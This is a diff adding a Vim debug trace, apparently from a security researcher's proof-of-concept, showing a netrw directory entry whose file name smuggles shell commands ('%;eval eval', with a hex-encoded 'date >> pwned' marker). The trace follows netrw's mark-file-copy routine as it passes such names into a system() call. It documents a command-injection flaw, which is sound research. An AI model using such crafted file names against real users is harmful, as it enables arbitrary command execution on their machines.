@@ -1,0 +1,29 @@
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+<uln/vim/netrw.v3/sploit/foo/home/rdancer/vuln/vim/netrw.v3/sploit/foo%;eval eval ;'bar/;eval eval echo 0:64617465203e3e2070776e6564  [RO]
+Entering Debug mode.  Type "cont" to continue.
+cmd: norm mc
+cmd: call <SNR>16_NetrwMarkFileCopy(1)
+line 4: if !exists("s:netrwmarkfilelist_{bufnr('%')}") || empty(s:netrwmarkfilelist_{bufnr('%')})
+line 8: endif
+line 10: if !exists("s:netrwmftgt")
+line 14: endif
+line 16: let curdir   = b:netrw_curdir
+line 17: let curbufnr = bufnr("%")
+line 19: if      a:islocal &&  s:netrwmftgt_islocal
+line 22: let args= join(map(copy(s:netrwmarkfilelist_{bufnr('%')}),"b:netrw_curdir.\"/\".shellescape(v:val)"))
+line 24: call system(g:netrw_localcopycmd." ".args." ".shellescape(s:netrwmftgt))
+line 26: elseif  a:islocal && !s:netrwmftgt_islocal
+>
